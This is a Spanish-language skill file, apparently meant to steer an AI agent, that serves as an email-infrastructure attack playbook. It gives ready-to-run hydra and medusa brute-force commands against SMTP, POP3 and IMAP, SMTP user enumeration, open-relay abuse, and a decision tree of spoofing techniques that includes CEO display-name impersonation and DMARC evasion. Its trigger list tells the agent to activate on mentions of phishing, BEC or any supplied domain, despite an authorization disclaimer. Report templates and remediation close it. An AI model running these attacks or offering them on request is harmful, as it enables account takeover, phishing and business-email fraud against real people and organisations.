# SKILL: email-pentest — Auditoría de Servidores de Correo, Fuerza Bruta y Email Spoofing

## Descripción
Esta skill cubre la ejecución de pruebas de concepto (POC) sobre infraestructura de correo electrónico: reconocimiento de servicios de email (SMTP, POP3, IMAP), enumeración de usuarios, ataques de diccionario y fuerza bruta sobre autenticación, verificación de configuraciones DNS (SPF, DKIM, DMARC), detección de Open Relay, y pruebas de suplantación de identidad (email spoofing). Integra el repositorio [hackingyseguridad/email](https://github.com/hackingyseguridad/email) con herramientas nativas de Kali Linux.

**Uso exclusivo en entornos autorizados.** Requiere permiso escrito del propietario del dominio y sistemas objetivo.

---

## Activación (triggers)

Activar esta skill SIEMPRE que el usuario mencione cualquiera de los siguientes términos o contextos:

- SMTP, ESMTP, POP3, IMAP, servidor de correo, servidor de email, MTA, MDA
- Spoofing de email, suplantación de correo, email spoofing, email forgery, email falso
- SPF, DKIM, DMARC, registros DNS de email, MX record, Open Relay, relay abierto
- Phishing técnico, BEC (Business Email Compromise), SCAM de correo
- Fuerza bruta SMTP, brute force email, ataque de diccionario POP3 / IMAP
- Enumeración de usuarios SMTP, VRFY, EXPN, RCPT TO enumeration
- Display-name spoofing, From header manipulation, X-Mailer, Reply-To
- Blacklist IP de correo, lista negra SPAM, reputación IP SMTP
- Scripts del repo: `openrelay.sh`, `escaner.sh`, `dmark.sh`, `dns.sh`, `analizaremail.sh`, `envioconsola.sh`, `enviolocalhost*.sh`, `envioconsmtp*.py`
- El usuario proporciona un dominio/FQDN/IP y solicita prueba de autenticación o spoofing de correo

---

## Prerequisitos del entorno

### Instalación del repositorio
```bash
git clone https://github.com/hackingyseguridad/email.git /opt/email
cd /opt/email && chmod +x *.sh && bash instalar.sh
```

### Herramientas requeridas (Kali Linux — preinstaladas o instalables)
| Herramienta | Uso principal |
|-------------|--------------|
| `nmap` | Detección de puertos y servicios de email |
| `hydra` | Fuerza bruta SMTP / POP3 / IMAP |
| `medusa` | Fuerza bruta alternativa multi-protocolo |
| `smtp-user-enum` | Enumeración de usuarios via VRFY / EXPN / RCPT |
| `swaks` | Swiss Army Knife SMTP — envío/prueba manual |
| `curl` | Pruebas HTTP y webmail |
| `telnet` / `netcat` | Conexión manual a puertos SMTP/POP3/IMAP |
| `dig` / `host` / `nslookup` | Consultas DNS (MX, TXT, SPF, DKIM, DMARC) |
| `mxtoolbox` | Verificación online de registros email |
| `postfix` | Servidor SMTP local para pruebas de spoofing |
| `python3` | Scripts de envío con cabeceras modificadas |

### Instalación de dependencias adicionales
```bash
apt install swaks smtp-user-enum postfix dovecot-imapd -y
pip3 install smtplib email --break-system-packages
bash /opt/email/instalarpostfix.sh     # Configura Postfix en localhost
bash /opt/email/instalardovecot.sh     # Configura Dovecot POP3/IMAP local
```

---

## Flujo de trabajo estándar

```
1. Reconocimiento DNS         →  registros MX, TXT, SPF, DKIM, DMARC
2. Detección de servicios     →  nmap puertos 25, 587, 465, 110, 143, 993, 995
3. Enumeración de usuarios    →  VRFY, EXPN, RCPT TO
4. Verificar Open Relay       →  openrelay.sh / swaks / telnet
5. Fuerza bruta auth          →  hydra/medusa contra SMTP/POP3/IMAP
6. Prueba de spoofing         →  envío con FROM manipulado según nivel de protección
7. Análisis de cabeceras      →  analizaremail.sh / ver correo original
8. Documentar hallazgos       →  credenciales, relay abierto, spoofing exitoso
```

---

## FASE 1 — Reconocimiento DNS de infraestructura de email

### Registros MX (servidores de correo del dominio)
```bash
dig MX dominio.com +short
host -t MX dominio.com
nslookup -type=MX dominio.com

# Script del repo
bash /opt/email/dns.sh dominio.com
bash /opt/email/registrosdns.sh dominio.com
bash /opt/email/registrosauto.sh dominio.com    # automatización completa de registros
```

### Verificación SPF
```bash
# Consulta manual
dig TXT dominio.com +short | grep spf

# Interpretar resultados:
# "v=spf1 include:_spf.google.com ~all"   → softfail (permite spoofing potencial)
# "v=spf1 ip4:1.2.3.4 -all"              → hardfail (rechaza todo lo no listado)
# (sin registro SPF)                       → sin protección, spoofing factible
```

### Verificación DKIM
```bash
# El selector DKIM varía por dominio (common: default, google, mail, dkim)
dig TXT selector._domainkey.dominio.com +short
dig TXT default._domainkey.dominio.com +short
dig TXT google._domainkey.dominio.com +short
```

### Verificación DMARC
```bash
dig TXT _dmarc.dominio.com +short

# Interpretar política (p=):
# p=none       → sólo monitoriza, NO rechaza → spoofing posible en muchos casos
# p=quarantine → manda a spam (cuarentena)
# p=reject     → rechaza el email → protección máxima

# Script del repo
bash /opt/email/dmark.sh dominio.com
```

### Escáner completo de email del dominio
```bash
bash /opt/email/escaner.sh dominio.com
# Ejecuta: MX lookup + SPF + DKIM + DMARC + blacklist check + banner SMTP
```

### Verificación de listas negras (Blacklist / SPAM)
```bash
bash /opt/email/listanegra.sh <IP_servidor_SMTP>
# Comprueba contra: Spamhaus, Barracuda, SORBS, MXToolBox, etc.

# Online complementario:
# https://check.spamhaus.org/
# https://mxtoolbox.com/blacklists.aspx
```

---

## FASE 2 — Detección y enumeración de servicios de email

### Escaneo de puertos de email
```bash
nmap -sV -p 25,110,143,465,587,993,995,2525 --open -T4 <IP_o_FQDN> \
  -oN /tmp/email_puertos.txt

# Puertos de referencia:
# 25   → SMTP (envío entre servidores)
# 587  → SMTP submission (autenticación usuario → servidor)
# 465  → SMTPS (SMTP sobre SSL/TLS)
# 110  → POP3
# 995  → POP3S (POP3 sobre SSL/TLS)
# 143  → IMAP
# 993  → IMAPS (IMAP sobre SSL/TLS)
```

### Banner grabbing y comandos SMTP manuales
```bash
# Telnet manual
telnet <IP> 25
# Comandos SMTP para explorar:
EHLO test.com        # lista capacidades del servidor
VRFY usuario         # verifica si usuario existe (si habilitado)
EXPN lista           # expande lista de distribución (si habilitado)
HELP                 # lista comandos disponibles
QUIT

# Netcat
nc <IP> 25
nc -v <IP> 587

# SWAKS — test completo de conectividad SMTP
swaks --to test@dominio.com --server <IP>
swaks --to test@dominio.com --server <IP> --port 587 --tls
```

### Enumeración de usuarios SMTP
```bash
# smtp-user-enum — método VRFY
smtp-user-enum -M VRFY -U /opt/diccionarios/usuarios.txt -t <IP>

# smtp-user-enum — método RCPT (más sigiloso)
smtp-user-enum -M RCPT -U /opt/diccionarios/usuarios.txt \
  -t <IP> -D dominio.com

# smtp-user-enum — método EXPN
smtp-user-enum -M EXPN -U /opt/diccionarios/usuarios.txt -t <IP>

# Nmap NSE
nmap --script smtp-enum-users --script-args \
  smtp-enum-users.methods=VRFY,RCPT,EXPN -p 25 <IP>
```

### Enumeración de usuarios POP3
```bash
# Script del repo
bash /opt/email/enum4pop3.sh <IP>
bash /opt/email/pruebapop3.sh <IP>
bash /opt/email/prueba_pop3.sh <IP>
```

---

## FASE 3 — Fuerza bruta y ataque de diccionario

### SMTP — Autenticación
```bash
# Hydra contra SMTP con autenticación
hydra -L /opt/diccionarios/usuarios.txt -P /opt/diccionarios/passwords.txt \
  smtp://<IP>:587 -t 4 -V -S -o /tmp/brute_smtp.txt

# Hydra contra SMTPS (SSL)
hydra -L /opt/diccionarios/usuarios.txt -P /opt/diccionarios/passwords.txt \
  -S smtp://<IP>:465 -t 4 -V

# Medusa
medusa -h <IP> -U /opt/diccionarios/usuarios.txt \
  -P /opt/diccionarios/passwords.txt -M smtp -t 4 -v 6
```

### POP3 — Autenticación
```bash
# Hydra
hydra -L /opt/diccionarios/usuarios.txt -P /opt/diccionarios/passwords.txt \
  pop3://<IP> -t 4 -V -o /tmp/brute_pop3.txt

# POP3S
hydra -L /opt/diccionarios/usuarios.txt -P /opt/diccionarios/passwords.txt \
  -S pop3://<IP>:995 -t 4 -V

# Medusa
medusa -h <IP> -U /opt/diccionarios/usuarios.txt \
  -P /opt/diccionarios/passwords.txt -M pop3 -t 4
```

### IMAP — Autenticación
```bash
# Hydra
hydra -L /opt/diccionarios/usuarios.txt -P /opt/diccionarios/passwords.txt \
  imap://<IP> -t 4 -V -o /tmp/brute_imap.txt

# IMAPS
hydra -L /opt/diccionarios/usuarios.txt -P /opt/diccionarios/passwords.txt \
  -S imap://<IP>:993 -t 4 -V

# Medusa
medusa -h <IP> -U /opt/diccionarios/usuarios.txt \
  -P /opt/diccionarios/passwords.txt -M imap -t 4
```

### Verificación manual de credenciales encontradas
```bash
# POP3 manual con telnet
telnet <IP> 110
USER <usuario_encontrado>
PASS <password_encontrado>
LIST          # lista mensajes
RETR 1        # descarga primer mensaje
QUIT

# IMAP manual
telnet <IP> 143
a LOGIN <usuario> <password>
a LIST "" "*"
a SELECT INBOX
a FETCH 1 BODY[]
a LOGOUT
```

---

## FASE 4 — Detección y explotación de Open Relay

Un servidor SMTP Open Relay permite que cualquier origen externo envíe correo hacia cualquier destino sin autenticación — vulnerabilidad crítica explotable para spam y spoofing.

### Verificación de Open Relay
```bash
# Script del repo
bash /opt/email/openrelay.sh <IP>

# SWAKS — prueba de relay
swaks --to victima@dominio-externo.com \
      --from spoofed@otro-dominio.com \
      --server <IP> --port 25

# Telnet manual
telnet <IP> 25
EHLO test.com
MAIL FROM:<atacante@externo.com>
RCPT TO:<victima@otro-dominio.com>
DATA
Subject: Test Open Relay
Esto es una prueba de open relay.
.
QUIT
# Si responde "250 OK" al RCPT TO de dominio externo → Open Relay confirmado

# Nmap NSE
nmap --script smtp-open-relay -p 25 <IP>
```

---

## FASE 5 — Email Spoofing: Suplantación de identidad

### Árbol de decisión para spoofing (según nivel de protección del dominio destino)

```
¿El dominio origen tiene SPF?
├── NO → Técnica 1: Manipulación directa del campo FROM
└── SÍ → ¿Qué política?
         ├── ~all (softfail) → Técnica 1/2 puede funcionar en destinos laxos
         └── -all (hardfail) → Verificar DMARC
                               ├── p=none   → Técnica 2/8 posible
                               ├── p=quarantine → Técnica 4/7/10
                               └── p=reject → Técnica 4 (display-name) o 7 (typosquatting)
```

---

### Técnica 1 — Manipulación directa del campo FROM (SMTP sin auth)
**Condición:** Servidor SMTP objetivo no verifica remitente / dominio sin SPF o con softfail

```bash
# Script del repo — envío desde consola básico
bash /opt/email/envioconsola.sh

# SWAKS con FROM suplantado
swaks --to victima@destino.com \
      --from ceo@empresa-victima.com \
      --header "Subject: Urgente - Acción requerida" \
      --server <IP_smtp_abierto> --port 25

# Python3 — envioconsmtp.py (del repo)
python3 /opt/email/envioconsmtp.py
# Editar variables: FROM, TO, SUBJECT, BODY, SMTP_SERVER
```

### Técnica 2 — Modificación de cabeceras X-Mailer y Reply-To
**Condición:** Servidor permite cabeceras personalizadas; destino no filtra estrictamente

```bash
# Script del repo con cabeceras extendidas
bash /opt/email/enviolocalhost8.sh

# Python3 con cabeceras manipuladas
python3 /opt/email/envioconsmtp2.py
python3 /opt/email/enviocongmail3.py     # via Gmail SMTP + cabeceras modificadas

# Cabeceras clave a manipular:
# From: "Nombre Legítimo" <atacante@dominio.com>
# Reply-To: victima@empresa.com
# Return-Path: bounce@controlado.com
# X-Mailer: Microsoft Outlook 16.0
```

### Técnica 3 — Servidor SMTP propio en localhost (Postfix)
**Condición:** Enviar con control total sobre SMTP y DNS propios

```bash
# Instalar y configurar Postfix local
bash /opt/email/instalarpostfix.sh

# Configurar main.cf para localhost sin restricciones
cp /opt/email/postfix_conf_localhost.txt /etc/postfix/main.cf
systemctl restart postfix

# Enviar con Python3 desde localhost
python3 /opt/email/enviolocalhost.py
python3 /opt/email/enviolocalhost2.py

# Scripts Bash desde localhost
bash /opt/email/enviolocalhost3.sh
bash /opt/email/enviolocalhost4.sh
bash /opt/email/enviolocalhost5.sh
bash /opt/email/enviolocalhost6.sh
bash /opt/email/enviolocalhost7.sh
bash /opt/email/enviolocalhost7b.sh
bash /opt/email/enviolocalhost9.sh
bash /opt/email/enviolocalhost10.sh
bash /opt/email/enviolocalhostdnark2.py   # con DMARC p=none bypass
bash /opt/email/enviolocalhostauto.sh      # envío automatizado
```

### Técnica 4 — Display-Name Spoofing (destinos con filtros máximos)
**Condición:** Gmail, Outlook, Protonmail — verificaciones completas SPF+DKIM+DMARC activas. El SMTP autentica con cuenta real pero el "display-name" muestra nombre suplantado.

```bash
# Via Gmail SMTP con cuenta real pero nombre suplantado
bash /opt/email/enviocongmail.sh
bash /opt/email/enviocongmail1.sh
python3 /opt/email/enviocongmail.py
python3 /opt/email/enviocongmail1.py
python3 /opt/email/enviocongmail2.py

# Ejemplo de cabecera de spoofing por display-name:
# From: "CEO Empresa Víctima <ceo@empresa-real.com>" <atacante@gmail.com>
# El cliente de correo destino muestra: CEO Empresa Víctima <ceo@empresa-real.com>
# pero la dirección real es atacante@gmail.com
```

### Técnica 5 — SMTP con DMARC bypass via DNS propio
**Condición:** Control sobre servidor DNS; dominio atacante con DMARC p=none

```bash
# Configurar DNS falso para el dominio atacante
python3 /opt/email/fakedns.py
python3 /opt/email/fakedns2.py

# Generar certificados TLS para el servidor SMTP
bash /opt/email/generacert.sh

# Configurar DKIM propio
bash /opt/email/config_dkin_dns.sh dominio-atacante.com

# Envío con DMARC local configurado
python3 /opt/email/enviolocalcondmark.py
python3 /opt/email/enviolocalhostdnark2.py
```

### Técnica 6 — Via Amazon SES u otros proveedores SMTP externos
**Condición:** Acceso a cuenta de proveedor SMTP legítimo con IP de buena reputación

```bash
# Via Amazon SES
bash /opt/email/envioconamazon.sh
# Requiere: AWS_ACCESS_KEY, AWS_SECRET_KEY, dominio verificado en SES

# Providers SMTP gratuitos para pruebas (puertos 587):
# smtp.mail.yahoo.com:587
# smtp.live.com:587
# smtp.gmail.com:587
# smtp.office365.com:587
```

---

## FASE 6 — Análisis de cabeceras de email recibido

Para verificar si un spoofing fue exitoso o analizar emails sospechosos recibidos durante el pentest:

```bash
# Script de análisis del repo
bash /opt/email/analizaremail.sh email_recibido.eml

# Campos clave a inspeccionar en cabeceras:
# Received: from [IP real del remitente]
# Authentication-Results: spf=pass/fail; dkim=pass/fail; dmarc=pass/fail
# X-Spam-Status: Yes/No
# Return-Path: (dirección real de rebote)
# Message-ID: (identificador único del mensaje)
```

### Ver correo original en Gmail (para evidencia)
```
Gmail → Menú ⋮ → "Mostrar original" (Ver correo original)
Referencia: https://support.google.com/mail/answer/29436?hl=es
```

### Dominios temporales para pruebas de recepción
```
https://temp-mail.org/es/
```

---

## Tabla resumen — Técnicas de spoofing vs nivel de protección

| Técnica | SPF | DKIM | DMARC | Probabilidad éxito |
|---------|-----|------|-------|--------------------|
| Manipulación FROM directo | ❌ sin SPF | ❌ | ❌ p=none | Alta |
| SMTP localhost + FROM falso | softfail | ❌ | p=none | Media-Alta |
| Open Relay de tercero | softfail | ❌ | p=none | Media |
| Display-name spoofing | ✅ | ✅ | ✅ p=reject | Alta (engaño visual) |
| DNS propio + DKIM propio | ✅ propio | ✅ propio | p=none | Media |
| Typosquatting de dominio | ✅ propio | ✅ propio | ✅ propio | Alta |
| Credencial comprometida | N/A | N/A | N/A | Muy Alta |

---

## Documentación de evidencias

### Captura de hallazgos

```bash
# Log de sesión completa
script -a /tmp/email_pentest_$(date +%Y%m%d_%H%M%S).log

# Capturar resultado de fuerza bruta
hydra ... -o /tmp/brute_email_$(date +%Y%m%d)_<SERVICIO>_<IP>.txt

# Guardar cabeceras de email de prueba recibido
# Gmail: Mostrar original → Descargar mensaje
```

### Campos de hallazgo para informe

**Hallazgo tipo: Credencial comprometida por diccionario**
```
Servicio afectado : SMTP / POP3 / IMAP
Puerto            : 587 / 110 / 143 / ...
IP / FQDN         : x.x.x.x / mail.dominio.com
Usuario válido    : usuario@dominio.com
Contraseña        : password123
Herramienta usada : Hydra
Comando ejecutado : hydra -L usuarios.txt -P passwords.txt smtp://x.x.x.x:587
Timestamp         : YYYY-MM-DD HH:MM:SS
CVSS v3.1         : 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
CWE               : CWE-307 — Improper Restriction of Excessive Authentication Attempts
```

**Hallazgo tipo: Open Relay**
```
Servicio afectado : SMTP Open Relay
Puerto            : 25
IP / FQDN         : x.x.x.x / mail.dominio.com
Descripción       : El servidor acepta correo de orígenes externos sin autenticación
Evidencia         : Respuesta "250 OK" a RCPT TO dominio externo no autorizado
Comando ejecutado : swaks --to externo@otro.com --from falso@cualquiera.com --server x.x.x.x
CVSS v3.1         : 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N)
CWE               : CWE-1286 — Improper Validation of Syntactic Correctness of Input
```

**Hallazgo tipo: Email Spoofing exitoso**
```
Dominio afectado  : dominio.com
Vector            : SPF ausente / DMARC p=none / Open Relay
Técnica usada     : Manipulación campo FROM / Display-name / SMTP propio
Evidencia         : Captura de cabeceras del correo recibido (Authentication-Results: spf=fail)
Script usado      : enviolocalhost7.sh / envioconsmtp.py
CVSS v3.1         : 8.1 (AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N)
CWE               : CWE-290 — Authentication Bypass by Spoofing
```

---

## Matriz de riesgo DNS vs spoofing

| Configuración DNS dominio origen | Riesgo spoofing | Acción recomendada |
|----------------------------------|-----------------|-------------------|
| Sin SPF + Sin DMARC | CRÍTICO | Implementar SPF -all + DMARC p=reject |
| SPF ~all + DMARC p=none | ALTO | Cambiar SPF a -all + DMARC p=reject |
| SPF -all + DMARC p=none | MEDIO | Subir DMARC a p=quarantine/reject |
| SPF -all + DMARC p=quarantine | BAJO-MEDIO | Subir DMARC a p=reject |
| SPF -all + DKIM + DMARC p=reject | BAJO | Mantener y monitorizar reportes DMARC |

---

## Remediación recomendada (para informe)

| Control | Implementación |
|---------|---------------|
| SPF estricto | `v=spf1 include:proveedor.com -all` (hardfail) |
| DKIM | Firma criptográfica en DNS + habilitado en MTA |
| DMARC p=reject | `v=DMARC1; p=reject; rua=mailto:dmarc@dominio.com` |
| Deshabilitar VRFY/EXPN | `disable_vrfy_command = yes` en Postfix |
| Evitar Open Relay | Configurar `smtpd_relay_restrictions` en Postfix |
| Bloqueo por intentos fallidos | fail2ban sobre logs de autenticación SMTP |
| TLS obligatorio | STARTTLS / SMTPS en todos los servicios |
| MFA en webmail | Segundo factor para acceso a cuentas |
| Monitorización DMARC | Revisar reportes `rua` periódicamente |
| Listas negras | Verificar reputación IP en Spamhaus, Barracuda |

---

## Referencias

- Repositorio principal: https://github.com/hackingyseguridad/email
- Diccionarios: https://github.com/hackingyseguridad/diccionarios
- Referencia técnica: http://www.hackingyseguridad.com
- Paper técnico del repo: `/opt/email/paper.pdf`
- Presentación Email Spoofing: `/opt/email/Email-SCAM-Spoofing-y-Phishing.ppt`
- Trazado de cabeceras Gmail: https://support.google.com/mail/answer/29436?hl=es
- Blacklist check: https://check.spamhaus.org / https://mxtoolbox.com/blacklists.aspx
- Email temporal para pruebas: https://temp-mail.org/es/
- RFC 5321 (SMTP), RFC 7208 (SPF), RFC 6376 (DKIM), RFC 7489 (DMARC)
- CWE-290: Authentication Bypass by Spoofing
- CWE-307: Improper Restriction of Excessive Authentication Attempts
- OWASP Testing Guide — OTG-AUTHN-003, OTG-CONFIG-006
